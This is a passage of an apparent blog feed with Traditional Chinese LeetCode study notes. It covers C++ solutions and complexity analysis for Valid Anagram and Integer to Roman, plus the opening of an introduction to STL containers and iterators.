class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><ul><li>首先透過 <code>unordered_map</code> 建立了一個 Hash table</li><li>若 <code>s</code> 與 <code>t</code> 長度不一致，可以提前回傳　<code>false</code></li><li>迭代 <code>ｓ</code>　建立 Hash table，並且 Key 會是 <code>s</code> 中出現的字母，value 會是出現次數</li><li>迭代 <code>t</code>，透過在 <code>Dict.find()</code> 中迭代 <code>t</code> 的字母，查看是否對應的 key 存在於 Hash Table 中</li><li>如果有，則該字母的對應將次數減少 (<code>Dict[t[i]]--;</code>)</li><li>如果已經減到0次，則將該key-value pair 從 Table 中移除</li><li>如果在 table 中沒找到 <code>t</code> 中的字母，則回傳　<code>false</code></li><li>最後若 table 不是空的，就代表t沒有完全匹配<code>s</code>，則一樣回傳 <code>false</code>，反之則回傳 <code>true</code></li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/242/results1.png"></p><h2 id="其他做法"><a href="#其他做法" class="headerlink" title="其他做法"></a>其他做法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isAnagram</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (s.<span class="built_in">length</span>() != t.<span class="built_in">length</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// A count vector with length 26 with init value 0</span></span><br><span class="line">        <span class="comment">// Count only lowercase letters </span></span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">count</span><span class="params">(<span class="number">26</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//build dictionary</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt; s.<span class="built_in">length</span>(); i++)&#123;</span><br><span class="line">            count[s[i] - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; t.<span class="built_in">length</span>(); i++)&#123;</span><br><span class="line">            count[t[i]-<span class="string">&#x27;a&#x27;</span>]--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> it=count.<span class="built_in">begin</span>(); it!=count.<span class="built_in">end</span>(); it++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(*it != <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>這裡與剛剛不同的是，這裡只宣告了一個 vector，大小為26，用來存放每個小寫字母的出現頻率，並且初始化為0</li><li>在迭代 s 的過程中，這裡會 <code>s[i] - &#39;a&#39;</code> 會先計算出字母索引，在vector中再++ (<code>count[s[i] - &#39;a&#39;]++;</code>)</li><li>在迭代 t 的過程中，會直接找對應的字母編號，並且將數量減1</li><li>最後，透過迭代器去迭代 vector，如果找到非0的數值，則代表 <code>t</code> 不是 <code>s</code> 的 Anagram，回傳 false</li></ul><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/242/results2.png"></p><h1 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>兩種做法都是 $O(n)$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>對於第一種我的做法，因為使用了 <code>unordered_map</code> 來存儲每個字元及其出現的次數。在最壞情況下，字串 s 中所有字元都是唯一的，因此字典的大小為 $O(k)$ 其中 $k$ 會是字元集大小，對於ASCII符號，k&#x3D;128，對於英文小寫字母，k&#x3D;26</p><blockquote><p>整體空間複雜度會是 $O(k)$，因為字典的大小與字符集的大小有關，並且在字串長度 $n$ 遠大於字符集大小 $k$ 時，可以認為空間複雜度是常數 $O(1)$</p></blockquote><p>第二種做法，<code>vector&lt;int&gt; count(26, 0);</code> vector 大小固定為 $O(1)$，因此為常數空間，複雜度為 $O(1)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Hash Table </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>整數到羅馬數字 | Medium |LeetCode#12 Integer to Roman</title>
      <link href="/posts/Integer_to_Roman.html"/>
      <url>/posts/Integer_to_Roman.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/12/question.png"><br><img src="/img/LeetCode/12/question2.png"></p><ul><li>題目難度：<code>Medium</code></li><li>題目敘述：題目主要需求是將輸入的整數 <code>num</code> 轉換成對應的羅馬數字符號，並給定一個對應表，在轉換過程有幾項轉換規則：<ul><li>羅馬數字是通過從最高位到最低位將小數位值的轉換連接起來形成的</li><li>如果該值不以4或9開頭,則選擇可以從輸入中減去的最大值的符號,將該符號附加到結果中,減去其值,然後將剩餘部分轉換為羅馬數字。</li><li>如果該值以4或9開頭,則使用表示從下一個符號中減去一個符號的減法形式,例如,4是 5(<code>V</code>)減去1(<code>I</code>):<code>IV</code>,而9是10(<code>X</code>)減去1(<code>I</code>):<code>IX</code>。只使用以下減法形式:4(<code>IV</code>)、9(<code>IX</code>)、40(<code>XL</code>)、90(<code>XC</code>)、400(<code>CD</code>)和900(<code>CM</code>)。</li><li>只有10的次方(<code>I</code>、<code>X</code>、<code>C</code>、<code>M</code>)可以最多連續附加3次以表示10的倍數。不能多次附加5(<code>V</code>)、50(<code>L</code>)或500(<code>D</code>)。如果需要附加4次符號,需使用減法形式</li></ul></li><li>限制： <code>1 &lt;= num &lt;= 3999</code></li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>我其實一開始偏向暴力解，就根據條件去個別判斷，然後從數字的高位數開始判斷並轉換符號，已經轉過的數字就減掉</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">intToRoman</span><span class="params">(<span class="type">int</span> num)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> counter=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">    string results;</span><br><span class="line">    <span class="comment">// 1000-3000</span></span><br><span class="line">    value = num /<span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;value;i++)&#123;</span><br><span class="line">        results+= <span class="string">&#x27;M&#x27;</span>;   </span><br><span class="line">    &#125;</span><br><span class="line">    num = num - value * <span class="number">1000</span>;</span><br><span class="line">    <span class="comment">// 100 - 900</span></span><br><span class="line">    <span class="keyword">if</span> (num / <span class="number">100</span> !=<span class="number">4</span> &amp;&amp; num /<span class="number">100</span> !=<span class="number">9</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (num &gt; <span class="number">500</span>)&#123;</span><br><span class="line">            value = (num - <span class="number">500</span>)/<span class="number">100</span>;</span><br><span class="line">            results += <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; value; i++)&#123;</span><br><span class="line">                results += <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            num = num - <span class="number">500</span> - <span class="number">100</span> * value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (num &lt; <span class="number">500</span>)&#123;</span><br><span class="line">            value = num/<span class="number">100</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt; value; i++)&#123;</span><br><span class="line">                results += <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            num = num - <span class="number">100</span>* value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            results += <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line">            num = num <span class="number">-500</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (num/<span class="number">100</span> == <span class="number">4</span>)&#123;</span><br><span class="line">        <span class="comment">// insert 400</span></span><br><span class="line">        results +=<span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">        results += <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line">        num = num - <span class="number">400</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (num/<span class="number">100</span> == <span class="number">9</span>)&#123;</span><br><span class="line">        results += <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">        results += <span class="string">&#x27;M&#x27;</span>;</span><br><span class="line">        num = num <span class="number">-900</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 10 - 90</span></span><br><span class="line">    <span class="keyword">if</span>(num / <span class="number">10</span> !=<span class="number">4</span> &amp;&amp; num /<span class="number">10</span> !=<span class="number">9</span> )&#123;</span><br><span class="line">        <span class="keyword">if</span>(num &gt; <span class="number">50</span>)&#123;</span><br><span class="line">            results += <span class="string">&#x27;L&#x27;</span>;</span><br><span class="line">            value = (num<span class="number">-50</span>)/<span class="number">10</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt; value; i++)&#123;</span><br><span class="line">                results += <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            num = num - <span class="number">50</span> - <span class="number">10</span> * value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (num &lt; <span class="number">50</span>)&#123;</span><br><span class="line">            value = num /<span class="number">10</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt; value; i++)&#123;</span><br><span class="line">                results += <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            num = num  - <span class="number">10</span> * value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            results += <span class="string">&#x27;L&#x27;</span>;</span><br><span class="line">            num = num <span class="number">-50</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (num /<span class="number">10</span> ==<span class="number">4</span>)&#123;</span><br><span class="line">        results += <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">        results += <span class="string">&#x27;L&#x27;</span>;</span><br><span class="line">        num = num - <span class="number">40</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (num /<span class="number">10</span> ==<span class="number">9</span>)&#123;</span><br><span class="line">        results += <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">        results += <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">        num = num - <span class="number">90</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1 - 9</span></span><br><span class="line">    <span class="keyword">if</span>(num !=<span class="number">4</span> &amp;&amp; num !=<span class="number">9</span> )&#123;</span><br><span class="line">        <span class="keyword">if</span> (num &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            results += <span class="string">&#x27;V&#x27;</span>;</span><br><span class="line">            value = num <span class="number">-5</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt; value; i++)&#123;</span><br><span class="line">                results += <span class="string">&#x27;I&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (num &lt; <span class="number">5</span>)&#123;</span><br><span class="line">            value = num;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt; value; i++)&#123;</span><br><span class="line">                results += <span class="string">&#x27;I&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            results += <span class="string">&#x27;V&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(num == <span class="number">4</span>)&#123;</span><br><span class="line">        results += <span class="string">&#x27;I&#x27;</span>;</span><br><span class="line">        results += <span class="string">&#x27;V&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (num ==<span class="number">9</span>)&#123;</span><br><span class="line">        results += <span class="string">&#x27;I&#x27;</span>;</span><br><span class="line">        results += <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> results;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><ul><li>從最高位的 1000 - 3000 開始處理，判斷最高位的數字，並且將 <code>results</code> 添加相對應個數的 <code>M</code></li><li>接著判斷百位數，首先處理400 以及 900 外的狀況，並且分別考慮 &gt;500 以及 &lt; 500 和 &#x3D; 500 的三種狀況，如果有500則需要額外在 <code>results</code> 添加 <code>D</code> 並且<code>num</code> 需要額外扣掉500</li><li>分別處理 400 和 900的狀況</li><li>接著處理十位數，一樣先處理 40, 90外的狀況，並且分別考慮 &gt;50, &lt;50 和 &#x3D;50 三種狀況，若有50則需額外在 <code>results</code> 添加 <code>L</code>,並且<code>results</code>要扣掉50</li><li>最後處理個位數</li><li>回傳結果</li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/12/results.png"></p><h2 id="其他做法"><a href="#其他做法" class="headerlink" title="其他做法"></a>其他做法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">intToRoman</span><span class="params">(<span class="type">int</span> num)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        string results=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        vector&lt;pair&lt;<span class="type">int</span>, string&gt;&gt; RomanDict = &#123;&#123;<span class="number">1000</span>, <span class="string">&quot;M&quot;</span>&#125;, &#123;<span class="number">900</span>, <span class="string">&quot;CM&quot;</span>&#125;, &#123;<span class="number">500</span>, <span class="string">&quot;D&quot;</span>&#125;, &#123;<span class="number">400</span>, <span class="string">&quot;CD&quot;</span>&#125;, &#123;<span class="number">100</span>, <span class="string">&quot;C&quot;</span>&#125;, &#123;<span class="number">90</span>, <span class="string">&quot;XC&quot;</span>&#125;, &#123;<span class="number">50</span>, <span class="string">&quot;L&quot;</span>&#125;, &#123;<span class="number">40</span>, <span class="string">&quot;XL&quot;</span>&#125;, &#123;<span class="number">10</span>, <span class="string">&quot;X&quot;</span>&#125;, &#123;<span class="number">9</span>, <span class="string">&quot;IX&quot;</span>&#125;, &#123;<span class="number">5</span>, <span class="string">&quot;V&quot;</span>&#125;, &#123;<span class="number">4</span>, <span class="string">&quot;IV&quot;</span>&#125;, &#123;<span class="number">1</span>, <span class="string">&quot;I&quot;</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt; RomanDict.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">while</span> (num &gt;= RomanDict[i].first)&#123;</span><br><span class="line">                results += RomanDict[i].second;</span><br><span class="line">                num -= RomanDict[i].first;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> results;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>另一種做法就是透過實作 Hash Table，這裡可以透過 C++ STL 中的 pair 容器去建立對應的字典，並且透過迴圈在判斷數字是否大於字典中的key欄位(數字)，如果大於等於該Key，則就在results 添加對應的符號，並且將num 扣除已經添加的數字<br>如此迭代下來，得出的結果也會是我們要的羅馬字串。</p><blockquote><p>在 Pair 中，可以透過 <code>first</code> 代表第一個元素，也就是key，<code>second</code> 可代表第二個元素，也就是 value</p></blockquote><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/12/results2.png"></p><h1 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h1><p>這裡可以分析最佳解的複雜度</p><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>這段代碼的時間複雜度為 $O(1)$</p><p>外層的 for 循環遍歷了 <code>RomanDict</code> 向量,向量的大小是固定的 13,所以循環執行的次數是常數時間 $O(1)$<br>內層的 while 循環的執行次數取決於輸入數字 num 的大小。然而,由於輸入範圍是有限的 (1 &lt;&#x3D; num &lt;&#x3D; 3999),因此內層循環的執行次數也是有限的。<br>在最壞的情況下,內層循環需要執行的次數與輸入數字的位數成正比。由於輸入範圍有限,位數也是有限的,因此內層循環的時間複雜度是常數時間 $O(1)$<br>總的來說,無論輸入數字是多少,程式碼的執行時間都是固定的,因此時間複雜度為常數時間 $O(1)$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>這段代碼的空間複雜度為 $O(1)$</p><p>程式碼中使用了一個固定大小的向量 <code>RomanDict</code> 來存儲羅馬數字及其對應的值,它的大小為 13,不隨輸入的變化而變化。<br>輸出字符串 <code>results</code> 的大小最多為 15 個字符(對應最大的羅馬數字”MMMCMXCIX”),這也是一個固定的常數空間。<br>因此,無論輸入數字是多少,代碼所需的額外空間都是固定的,因此空間複雜度為常數空間 $O(1)$</p><p>至於原本暴力解的複雜度在，輸入範圍提高的時候，複雜度也會隨之增加，如果需要支持更大範圍的輸入,當輸入數字 num 的大小增加時,這段代碼的時間複雜度將會變為 $O(logn)$,其中 n 是輸入數字的大小。</p><h1 id="參考"><a href="#參考" class="headerlink" title="參考"></a>參考</h1><p>[1] <a href="https://blog.techbridge.cc/2017/01/21/simple-hash-table-intro/">https://blog.techbridge.cc/2017/01/21/simple-hash-table-intro/</a><br>[2] <a href="https://shengyu7697.github.io/std-unordered_map/">https://shengyu7697.github.io/std-unordered_map/</a><br>[3] <a href="https://leozzmc.github.io/posts/efa232a7.html#Map-%E5%92%8C-MulitMap">https://leozzmc.github.io/posts/efa232a7.html#Map-%E5%92%8C-MulitMap</a></p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Hash Table </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ 刷題利器 - STL (Standard Template Library) | LeetCode</title>
      <link href="/posts/efa232a7.html"/>
      <url>/posts/efa232a7.html</url>
      
        <content type="html"><![CDATA[<h1 id="甚麼是-STL-Standard-Template-Library"><a href="#甚麼是-STL-Standard-Template-Library" class="headerlink" title="甚麼是 STL (Standard Template Library)?"></a>甚麼是 STL (Standard Template Library)?</h1><p>在 C++ 中，STL即為一群容器(Container)的集合，不同容器可以實現不同的資料結構，其實是大量使用了 C++中的 Template 來去實現的。<br>透過該資料結構實現出演算法，STL還提供對於容器的操作，不同資料結構的容器分別也有不同的操作方式。</p><blockquote><p>Template 簡單來說就是定義好結構，並且可用於不同的資料型別上，例如我寫了一個陣列的Template，但它可以是 int[], float[], double [] 或者是 char []<br><code>template &lt;typename T&gt;</code> 通常可以這樣來定義 Template ，通常使指角括號內的東西，可以想像成compiler 幫你做複製貼上</p></blockquote><h1 id="STL-元件"><a href="#STL-元件" class="headerlink" title="STL 元件"></a>STL 元件</h1><p>主要有6大個元件:</p><ul><li>容器 (Container)</li><li>演算法 (Algorithm)</li><li>迭代器（Iterator）</li><li>仿函數（Function object）</li><li>適配器（Adaptor）</li><li>空間配置器（allocator）</li></ul><blockquote><p>對於刷題，最需要focus的重點會是容器和迭代器，另外還有algorithm，例如 <code>sort</code>，通常以 function 的形式存在，多是一次性的計算，但Leetcode中大多需要自己實作，因此不細談</p></blockquote><h1 id="STL-容器"><a href="#STL-容器" class="headerlink" title="STL 容器"></a>STL 容器</h1><p><strong>container 通常是屬於資料結構的部份，以變數的方式存在，可持續地互動與維護資料</strong></p><p><img src="/img/LeetCode/C++_STL/containers.jpg"></p><p>其中Leetcode 能使用的容器類型有: <strong>Vector</strong>, <strong>List</strong>, <strong>Stack</strong>, <strong>Queue</strong>, <strong>PriorityQueue(Binary Heap)</strong>, <strong>Set&#x2F;MultiSet</strong>, <strong>Unorder Set</strong>, <strong>Map&#x2F;MultiMap</strong>, <strong>Unorder Map</strong></p><h1 id="STL-迭代器"><a href="#STL-迭代器" class="headerlink" title="STL 迭代器"></a>STL 迭代器</h1><p><strong>iterator 用來依序拜訪一個 container 的所有元素，也用以指稱 container 中的特定元素，可表達搜尋結果或者範圍的端點</strong></p><p>下面是範例</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n, i;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">    <span class="keyword">while</span> (cin &gt;&gt; n)</span><br><span class="line">    &#123;</span><br><span class="line">        v.<span class="built_in">resize</span>(n);</span><br><span class="line">        <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            cin &gt;&gt; v[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt;::iterator it=v.<span class="built_in">begin</span>(); it!=v.<span class="built_in">end</span>(); ++it)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; *it &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>取自: <a href="https://hackmd.io/@sa072686/cp/%2F%40sa072686%2FS11uDpiuH">https://hackmd.io/@sa072686/cp/%2F%40sa072686%2FS11uDpiuH</a></p></blockquote><p>可以看到在<code>for</code> 迴圈內可以使用 <code>vector&lt;int&gt;::iterator</code> 來去宣告一個迭代器 <code>it</code>，並且它會從 vector 的首端開始，若不等於尾端則+1；</p><p>這裡可以觀察到幾個重點:</p><ol><li>iterator 的宣告方式是 <code>容器類型::iterator</code></li><li>iterator 支援 <code>++</code> 或 <code>--</code> 運算</li><li><strong>支援 iterator 的 container，基本都能用 <code>.begin()</code> 取得最初的元素，<code>.end()</code> 取得最後的元素的再下一個位置，是個不存在的空位，符合 STL 左包含、右不包含的規則</strong></li><li>透過取值運算子 <code>*</code> 可以取得iterator目前位址的值</li></ol><blockquote><p>大多數的時候，把它理解為指標是沒有問題的（指標是迭代器的一個特例，它也屬於迭代器）</p></blockquote><h2 id="auto-自動型別判別"><a href="#auto-自動型別判別" class="headerlink" title="auto 自動型別判別"></a>auto 自動型別判別</h2><p>上面的範例會發現一件事，就是宣告 iterator的時候真的長度很長，因此有個偷懶作法就是透過 <code>auto</code> 